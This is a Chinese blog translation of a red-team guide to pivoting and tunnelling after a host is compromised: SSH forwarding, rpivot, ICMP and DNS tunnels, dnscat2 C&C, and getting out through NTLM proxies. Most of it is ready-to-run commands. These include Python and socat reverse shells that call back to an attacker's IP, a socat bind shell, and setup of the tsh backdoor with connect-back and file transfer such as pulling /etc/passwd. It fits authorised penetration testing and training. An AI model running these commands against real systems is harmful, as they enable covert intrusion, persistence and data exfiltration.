---
title: 一个红队成员的跳板（pivoting）指南
date: 2017-12-10 22:51:35
categories: Translation
tags:
---

本文翻译自 <https://artkond.com/2017/03/23/pivoting-guide/> ，正文如下：

----

渗透测试人员经常通过逻辑网络边界来访问客户的关键基础设施。常见的情况包括在成功的外围攻破之后，将攻击发展到内部网络，或者在危及组织内的主机之后访问初始的不可路由的网段。跳板是 red team/pentest 参与过程中使用的一系列技术，它们利用攻击者控制的主机作为逻辑网络进行跳跃，旨在扩大网络可视性。在这篇文章中，我将介绍常用的跳板技术和可用的工具。

<!-- more -->

## 以公有 IP 为目标

一个普遍的情况。比方说，你可以从互联网上找到一个网络应用程序中的 RCE 漏洞。你上传了一个 shell，并想把你的攻击发展到内部网络。请注意，在这种特定情况下，你应该能够绑定受感染主机上的端口，并且应该可以从外部网络访问这些端口。

### SSH 端口转发

设法找到在主机上运行的 SSH 服务的凭据？很好！连接到主机，如下所示：

```sh
ssh username@host -D 1080
```

这将在攻击者一侧产生一个 socks 服务器（ssh 客户端）。欢迎来到内部网络;）也可以将一个特定的端口转发给特定的主机。假设你需要访问主机 192.168.1.1 的内部网络中的 SMB 共享。

```sh
ssh username@host -L 445:192.168.1.1:445
```

这样，端口 445 就会被打开在攻击者一侧。请注意，要绑定特权端口（例如 445），你将需要在你的计算机上拥有 root 权限。

#### 通过 SSH 的 VPN

由于 openssh 4.3 版本，可以通过已建立的 ssh 通道来传输第 3 层网络流量。这比典型的 tcp 隧道有优势，因为你在控制 ip 流量。因此，例如，你可以使用 nmap 执行 SYN 扫描，并直接使用你的工具，而无需使用 `proxychains` 或其他代理工具。它是通过在客户端和服务器端创建 tun 设备并通过 ssh 连接在它们之间传输数据完成的。这很简单，但是由于 tun 设备的创建是一个特权操作，所以在两台机器上都需要 root。这些行应该出现在 `/etc/ssh/sshd_config` 文件（服务器端）中：

```sh
PermitRootLogin yes
PermitTunnel yes
```

客户端上的以下命令将在客户端和服务器上创建一对 tun 设备：

```sh
ssh username@server -w any:any
```

标志 `-w` 接受用冒号分隔的每一侧的 tun 设备的数量。可以显式设置 —— `-w 0:0`，也可以使用 `-w any:any` 语法来获取下一个可用的 tun 设备。
tun 设备之间的隧道已启用，但接口尚未配置。配置客户端的示例：

```sh
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0
```

服务器端：

```sh
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0
```

在服务器上启用 IP 转发和 NAT：

```sh
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```

现在，你可以将对等主机 `1.1.1.1` 设置为你的默认网关，或通过它路由到特定的主机/网络：

```sh
route add -net 10.0.0.0/16 gw 1.1.1.1
```

在这个例子中，服务器的外部网络接口是 `eth0`，两端新创建的 tun 设备是 `tun0`。

### 3proxy

在这里获取 - <https://github.com/z3APA3A/3proxy/releases> 。这个工具适用于多个平台。有预编译的 Windows 二进制文件。至于 Linux，你将需要自己编译它，这是一个很简单的事，只是 `./configure && make` :)这个工具是代理世界中的瑞士军刀，所以它有很多的功能。我通常使用它作为 socks 代理或端口转发。
这个工具从配置文件中获得所有选项。运行它：

```sh
3proxy.exe config_file
```

或者如果你在 Linux 系统上：

```sh
./3proxy config_file
```

要在端口 1080 上运行 3proxy 作为 socks5 代理，请在 config 中放置以下行：

```sh
socks -p1080
```

现在可以通过这个代理来隧道化你的渗透测试工具，以发展内部网络的攻击。这只是一个不太安全的基本设置。你可以使用选项来放置身份验证和/或基于 IP 的访问控制规则。去检查完整的手册在这里 - <https://3proxy.ru/howtoe.asp> 。要对特定端口进行隧道使用，请用以下语法：

```sh
tcppm <localport> <targethost> <targetport>
```

## NAT 场景

这是我在交战中遇到的最常见的情况。到目标的流量正在转发到逐个端口的基础上。这意味着除了端口转发规则以外的所有端口都不能从外部访问。一种可能的解决方案是启动反向连接。下面介绍的工具将帮助你做到这一点。

### SSH 反向端口转发/w 3proxy

这个跳板设置看起来像这样：
在目标服务器上使用以下配置运行 3proxy 服务：

```sh
socks -p31337
```

在接收方（攻击者的机器）上创建一个单独的用户。

```sh
adduser sshproxy
```

这个用户必须是低权限的，不应该有 shell 权限。毕竟，你不想被反向渗透，你呢？:)编辑 /etc/passwd 并将 shell 切换到 /bin/false。它应该是这样的：

```sh
root:x:0:0:root:/root:/bin/bash
...
sshproxy:x:1000:1001:,,,:/home/sshproxy:/bin/false
...
```

现在使用 `-R` 标志连接到新创建的用户的服务器。Linux 系统：

```sh
ssh sshproxy@your_server -R 31337:127.0.0.1:31337
```

对于 Windows，你将需要首先上传 [plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)。这是一个 putty 的控制台版本。运行它：

```sh
plink.exe sshproxy@your_server -R 31337:127.0.0.1:31337
```

`-R` 标志允许你绑定服务器端的端口。到此端口的所有连接都将被中继到客户端上的指定端口。这样我们就可以在客户端运行 3proxy socks 服务（受感染的机器）并通过 ssh`-R` 标志访问攻击者主机上的这个端口。

### Rpivot

这是我最喜欢穿越 NAT 连接的方法。[Rpivot](https://github.com/artkond/rpivot) 是一个反向 socks 代理工具，可以让你通过 socks 代理隧道化流量。它连接回你的机器，并绑定一个 socks 代理。它的工作方式与 `ssh -D` 很像，但方向相反。服务器端：

```sh
python server.py --proxy-port 1080 --server-port 9999 --server-ip 0.0.0.0
```

客户端：

```sh
python client.py --server-ip <ip> --server-port 9999
```

结果，一个 socks4 代理服务将被绑定在服务器端的 1080 端口。

## 从内部网络泄漏

这是另一种情况。比方说，你的社会工程学表演最终让你进入了内部网络。你的连接受限，并且能够在受感染的计算机上执行命令。当然，如果互联网直接路由，而不是用做防火墙，你可以凭借任何上述技术。但如果你不那么幸运，还是有办法把你的出路转出来。

### ICMP 隧道

如果 icmp 流量被允许到外部网络，那么很可能你可以建立一个 icmp 隧道。缺点是你需要在目标系统上拥有 root/administrator 权限，因为有必要使用原始套接字。检查这个工具 - <http://code.gerade.org/hans/> 。我个人从来没有尝试过在 Windows 上运行它。它在 Linux 上非常有效。服务器端命令（攻击者的机器）：

```sh
./hans -v -f -s 1.1.1.1 -p P@ssw0rd
```

`-v` 标志是详细的，`-f` 标志在前台运行，`-s` 标志的值是服务器在新创建的 tun 接口上的 ip。
客户端：

```sh
./hans -f -c <server_ip> -p P@ssw0rd -v
```

连接成功后，客户端应该可以直接在 1.1.1.100 处看到：

```sh
# ping 1.1.1.100
PING 1.1.1.100 (1.1.1.100) 56(84) bytes of data.
64 bytes from 1.1.1.100: icmp_seq=1 ttl=65 time=42.9 ms
```

现在你可以使用这台机器作为进入内部网络的大门。将本机用作默认网关或连接到管理界面（ssh/tsh /web shell）。

### DNS 隧道

如果有任何广域网流量被阻塞，但是外部主机名被解析，那么就有可能通过DNS查询来进行隧道通信。你需要注册一个用于此技术工作的域名。[这个手册](http://dev.kryo.se/iodine/wiki/HowtoSetup)可能会帮助你设置你的名称服务器。

#### Iodine

如果发生这种情况，并且在服务器上获得了 root 访问权限，你可以试试 [iodine](http://code.kryo.se/iodine/)。它几乎像 hans icmp 隧道工具一样工作 - 它创建了一对 tun 适配器，并将它们之间的数据作为 DNS 查询进行隧道传输。服务器端：

```sh
iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
```

客户端：

```sh
iodine -f -P P@ssw0rd tunneldomain.com -r
```

连接成功将在地址 1.1.1.2 处产生直接的客户端可见性。请注意，这种隧道技术非常慢。你最好的选择是在生成的连接上使用一个压缩的 ssh 连接：

```sh
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```

#### Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) 通过递归 DNS 查询建立 C＆C 通道。这个工具不需要 root/administrator 权限（在 windows 和 linux 上都可以）。它也支持端口转发。服务器端：

```sh
ruby ./dnscat2.rb tunneldomain.com
```

客户端：

```sh
./dnscat2 tunneldomain.com
```

在收到服务器端的连接后，可以使用 `windows` 命令查看活动会话：

```sh
dnscat2> windows
0 :: main [active]
  dns1 :: DNS Driver running on 0.0.0.0:53 domains = tunneldomain.com [*]
  1 :: command session (debian)
  2 :: sh (debian) [*]
```

要启动端口转发，请选择带有 `session -i <num>` 的命令会话：

```sh
dnscat2> session -i 1
New window created: 1
New window created: 1
history_size (session) => 1000
This is a command session!

That means you can enter a dnscat2 command such as
'ping'! For a full list of clients, try 'help'.

command session (debian) 1>
```

使用 `listen [lhost:]lport rhost:rport` 命令转发一个端口：

```sh
command session (debian) 1> listen 127.0.0.1:8080 10.0.0.20:80
```

这将绑定攻击者机器上的 8080 端口，并将所有连接转发到 10.0.0.20:80。

### 公司的 HTTP 代理作为一种出路

HTTP 代理组织的地方为他们的员工访问外部网络应用程序提供了一个良好的渗出机会，因为你有正确的凭据;）

#### 使用 Rpivot

我已经在 NAT 穿越部分提到了这个工具。它还支持通过 NTLM HTTP 代理连接到外部世界。服务器端命令保持不变，使用客户端命令如下：

```sh
python client.py --server-ip <rpivot_server_ip> --server-port 9999\
--ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM\
--username Alice --password P@ssw0rd
```

或者如果你有 LM:NT 哈希而不是密码：

```sh
python client.py --server-ip <rpivot_server_ip>\
--server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM\
--username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```

#### Cntlm

[Cntlm](http://cntlm.sourceforge.net/) 是通过 NTLM 代理运行任何非代理感知程序的首选工具。基本上这个工具对一个代理进行身份验证，并将本地端口绑定到你指定的外部服务。这个端口绑定不需要任何认证，所以你可以直接使用你的工具（例如 putty/ssh）。它使用配置文件进行操作。这里有一个准系统配置的例子来转发端口 443（这个端口是最有可能被允许通过代理的）：

```sh
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```

运行：

```sh
cntlm.exe -c config.conf
```

或者如果你在 Linux 上：

```sh
./cntlm -c config.conf
```

现在，假设你已经在远程主机的 443 端口上运行 ssh，你可以启动 ssh 客户端（openssh/putty）并连接到本地端口 2222 来访问外部机器。

#### 通过 HTTP 代理的 OpenVpn

[OpenVpn](https://openvpn.net/index.php/open-source/documentation/howto.html) 是巨大的，所以它从头开始的配置超出了这篇文章的范围。只需简单提一下 - 它也支持通过 NTLM 代理的隧道 TCP 连接。将此行添加到你的配置文件中：

```sh
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```

凭证文件应该在不同的行上包含用户名和密码。而且，是的，你需要 root。

## 利用带有 proxychains 的 SOCKS

如果你的程序不使用原始套接字（例如，nmap syn-scan），那么很可能你可以使用 `proxychains` 来强制你的程序通过 socks 代理。编辑 /etc/proxychains.conf 中的代理服务器：

```sh
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 3128
```

准备好了，只需在你最喜欢的 pwn 工具上添加 `proxychains`：

```sh
proxychains program_name
```

与 proxychains 一起使用的 impacket's psexec.py：

![proxychains psexec](/images/pivoting1.png)

## DNS 与 proxychains

Proxychains 在解析主机名时不遵循 socks RFC。它拦截 `gethostbyname` libc 调用并通过 socks 代理隧道化 tcp DNS 请求。事情是，DNS 服务器硬编码到 `4.2.2.2`。你可能需要更改名称服务器以解析内部网络上的名称。一个典型的情况是如果你正在测试 Windows 环境，将名称服务器更改为域控制器。该设置位于 `/usr/lib/proxychains3/proxyresolv`：

```sh
#!/bin/sh
# This script is called by proxychains to resolve DNS names

# DNS server used to resolve names
DNS_SERVER=${PROXYRESOLV_DNS:-4.2.2.2}    #change nameserver here


if [ $# = 0 ] ; then
    echo "  usage:"
    echo "      proxyresolv <hostname> "
    exit
fi
```

## 美化你的 web shell

这部分内容与 pivoting 或 tunneling 没有直接关系，而是描述了在内部网络发展攻击时简化工作的方法。通常情况下，使用 web-shell 非常繁琐，特别是在使用需要交互式命令界面的程序时。很可能你会使用一些解决方法来执行简单的任务，比如将密码传递给 sudo/su 或者只是编辑一个文件。我不是一个折磨自己的狂热爱好者，所以当有一个机会将 web-shell 升级到一个交互式 shell 时，我这样做:)我不会介绍像使用 bash/perl/python 等启动半交互式 shell。有很多关于这样做的信息。看看这个反向 shell 备忘单 - <http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet> 。

### Python PTY shell

从常规的半交互式 shell 升级。你可以在现有的 shell 中执行以下命令：

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```

或者启动反向连接：

```sh
python -c 'import socket,subprocess,os;\
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\
s.connect(("<attackers_ip>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);\
os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

### Socat

Netcat 的加强版！可是说实话，去检查这个[工具](http://www.dest-unreach.org/socat/)的手册 `man socat`，你会惊奇你可以用这个工具做隧道化的工作。除此之外，它可以产生一个完全交互的 shell，甚至比前面提到的 python-pty 更好。缺点是你很可能将不得不在目标服务器上编译/安装这个工具，因为它不是大多数类 Unix 发行版中的默认工具。

#### 绑定 shell

设置监听器：

```sh
socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
```

连接到监听器：

```sh
socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```

#### 反向 shell

设置监听器：

```sh
socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
```

连接到攻击者的机器：

```sh
socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```

#### 终端大小

默认情况下，终端的大小是相当小的，当启动 `top` 命令或使用文本编辑器编辑文件时你可能会注意到。你可以很容易地改变这个，使用 `stty -a` 命令来获得你的常规终端的大小：

```sh
$ stty -a
speed 38400 baud; rows 57; columns 211; line = 0;
```

将所需的尺寸应用到你的 socat 终端：

```sh
stty rows 57 cols 211
```

### Tsh

[Tsh](https://github.com/creaktive/tsh) 是一个小型的 ssh 式后门，带有完整的 pty 终端，并具有文件传输能力。这个工具的占用空间非常小，并且很容易在大多数类 Unix 系统上编译。从编辑 tsh.h 文件开始：

```c
#ifndef _TSH_H
#define _TSH_H

char *secret = "never say never say die";

#define SERVER_PORT 22
short int server_port = SERVER_PORT;
/*
#define CONNECT_BACK_HOST  "localhost"
#define CONNECT_BACK_DELAY 30
*/
#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
```

更改 `secret`，指定 `SERVER_PORT`。如果你想反向连接，取消注释并编辑 `CONNECT_BACK_HOST` 和 `CONNECT_BACK_DELAY` 指令。运行 make：

```makefile
$ make linux_x64
make								\
	LDFLAGS=" -Xlinker --no-as-needed -lutil"	\
	DEFS=" -DLINUX"					\
	tsh tshd
make[1]: Entering directory '/tmp/tsh'
gcc -O3 -W -Wall -DLINUX -c pel.c
gcc -O3 -W -Wall -DLINUX -c aes.c
gcc -O3 -W -Wall -DLINUX -c sha1.c
gcc -O3 -W -Wall -DLINUX -c tsh.c
gcc -Xlinker --no-as-needed -lutil -o tsh pel.o aes.o sha1.o tsh.o
strip tsh
gcc -O3 -W -Wall -DLINUX -c tshd.c
gcc -Xlinker --no-as-needed -lutil -o tshd pel.o aes.o sha1.o tshd.o
strip tshd
make[1]: Leaving directory '/tmp/tsh'
```

现在在服务器上运行 `./tshd`。它将开始监听指定的端口。您可以通过执行以下命令连接到它：

```sh
./tsh host_ip
```

如果 tsh 被编译有反向连接功能，`tshd` 守护进程将尝试连接回攻击者的机器。在攻击者侧启动监听：

```sh
$ ./tsh cb
Waiting for the server to connect...
```

用 tsh 传输文件：

```sh
./tsh host_ip get /etc/passwd .
./tsh host_ip put /bin/netcat /tmp
```
